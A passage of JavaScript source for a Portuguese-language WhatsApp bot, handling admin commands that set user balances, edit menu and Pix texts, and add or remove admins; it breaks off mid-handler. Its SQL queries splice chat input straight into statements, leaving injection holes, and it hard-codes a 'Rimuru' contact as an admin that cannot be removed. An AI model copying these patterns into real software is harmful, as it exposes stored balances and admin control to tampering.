        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/definirsaldo===") > -1 && Adms.includes(Numero)) {
            try {
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
                msg = Mensagem_Texto.split("===")

                if (msg[1] === "" || Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                USUARIO = msg[1]

                SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${USUARIO}@c.us'`).get()["SALDO"]
                SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);

                NOVO_SALDO = msg[2]
                NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2);
                Texto = `*SALDO DO USUÁRIO ALTERADO COM SUCESSO!*

*USUÁRIO:* ${USUARIO}
*SALDO ANTERIOR:* ${SALDO_USUARIO}
*SALDO ATUAL:* ${NOVO_SALDO}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${USUARIO}@c.us'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textomenuinicial===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TEXTO_MENU_INICIAL = msg[1]
                TEXTO_MENU_INICIAL = TEXTO_MENU_INICIAL.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MENU_INICIAL}' WHERE PARAMETRO = 'TEXTO_MENU_INICIAL'`).run()

                Texto = `*TEXTO DO MENU INCIAL ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textopixauto===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TEXTO_PIX_AUTOMATICO = msg[1]
                TEXTO_PIX_AUTOMATICO = TEXTO_PIX_AUTOMATICO.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_PIX_AUTOMATICO}' WHERE PARAMETRO = 'TEXTO_PIX_AUTOMATICO'`).run()

                Texto = `*TEXTO DO PIX AUTOMATICO ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textopixautodesativado===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TEXTO_PIX_AUTO_DESATIVADO = msg[1]
                TEXTO_PIX_AUTO_DESATIVADO = TEXTO_PIX_AUTO_DESATIVADO.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_PIX_AUTO_DESATIVADO}' WHERE PARAMETRO = 'TEXTO_PIX_AUTO_DESATIVADO'`).run()

                Texto = `*TEXTO DO PIX AUTO DESATIVADO ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/adcadm===") > -1 && Adms.includes(Numero)) {
            try {

                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                CONTATO_ADM = msg[1].toString().toUpperCase().replace(/[^0-9]/igm, '')

                Array_Gerentes = await DataBase_Better.prepare(`SELECT * FROM GERENTES WHERE ID_CONTATO = '${CONTATO_ADM}'`).all();
                if (Array_Gerentes.length > 0) {
                    Adms = []
                    Adms.push(Numero_Dono)

                    Array_Gerentes = await DataBase_Better.prepare(`SELECT * FROM GERENTES`).all()
                    for await (Gerente of Array_Gerentes) {
                        Adms.push(Gerente["ID_CONTATO"])
                    }

                    Texto = `*ESTE NÚMERO JÁ ESTAVA COMO ADM DO BOT!*

*LISTA ATUAL DE ADMS*

${Adms.join("\n")}

*Rimuru* é um ADM que não pode ser removido!`
                    Rimuru_Contato = await Rimuru_Contato_Plan()
                    Adms.push(Rimuru_Contato)

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                await DataBase_Better.prepare(`INSERT INTO CONTATOS (ID_CONTATO,SALDO,NOME,DATA_MS_INSERIDO) VALUES ('${CONTATO_ADM}@c.us','0','0','${Date.now()}') ON CONFLICT DO NOTHING`).run()
                await DataBase_Better.prepare(`INSERT INTO GERENTES (ID_CONTATO) VALUES ('${CONTATO_ADM}') ON CONFLICT DO NOTHING`).run()

                Adms = []
                Adms.push(Numero_Dono)

                Array_Gerentes = await DataBase_Better.prepare(`SELECT * FROM GERENTES`).all()
                for await (Gerente of Array_Gerentes) {
                    Adms.push(Gerente["ID_CONTATO"])
                }

                Texto = `*NOVO ADM ADICIONADO: wa.me/${CONTATO_ADM}*

*LISTA ATUAL DE ADMS*

${Adms.join("\n")}

*Rimuru* é um ADM que não pode ser removido!
`
                Rimuru_Contato = await Rimuru_Contato_Plan()
                Adms.push(Rimuru_Contato)
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Algo deu errado...`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/deladm===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            CONTATO_ADM = msg[1].toString().toUpperCase().replace(/[^0-9]/igm, '')

            Array_Gerentes = await DataBase_Better.prepare(`SELECT * FROM GERENTES WHERE ID_CONTATO = '${CONTATO_ADM}'`).all();
            if (Array_Gerentes.length === 0) {
                Adms = []
                Adms.push(Numero_Dono)

                Array_Gerentes = await DataBase_Better.prepare(`SELECT * FROM GERENTES`).all()
                for await (Gerente of Array_Gerentes) {
                    Adms.push(Gerente["ID_CONTATO"])
                }

